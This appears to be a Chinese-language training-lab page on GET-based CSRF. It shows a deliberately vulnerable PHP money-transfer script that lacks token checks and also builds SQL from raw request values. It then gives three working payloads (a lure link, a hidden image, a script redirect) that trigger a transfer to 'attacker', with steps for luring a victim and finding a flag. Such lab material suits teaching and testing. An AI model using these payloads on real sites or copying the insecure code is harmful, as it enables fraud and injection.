# GET 型 CSRF

## 概述

最简单的 CSRF 攻击方式。当敏感操作通过 GET 请求执行时，攻击者只需要诱导用户点击一个链接即可。

## 漏洞代码

```php
<?php
// 转账操作使用 GET 请求
$to = $_GET['to'];
$amount = $_GET['amount'];

// 直接执行，没有 CSRF token 验证
$sql = "UPDATE accounts SET balance = balance - $amount WHERE user_id = $user_id";
mysqli_query($conn, $sql);

$sql = "UPDATE accounts SET balance = balance + $amount WHERE username = '$to'";
mysqli_query($conn, $sql);
?>
```

## 攻击方式

### 1. 隐藏链接

```html
<a href="http://bank.com/transfer?to=attacker&amount=10000">
  点击领取红包
</a>
```

### 2. 隐藏图片

```html
<img src="http://bank.com/transfer?to=attacker&amount=10000" style="display:none">
```

### 3. JavaScript 自动跳转

```html
<script>
window.location.href = "http://bank.com/transfer?to=attacker&amount=10000";
</script>
```

## 练习步骤

1. 登录靶场，查看转账功能
2. 观察 URL 格式：`/transfer.php?to=xxx&amount=xxx`
3. 构造恶意链接
4. 诱导用户点击（或使用 img 标签自动加载）
5. 验证转账是否成功

## flag

在转账成功页面或服务器日志中查找 `CR{...}` 格式的 flag。
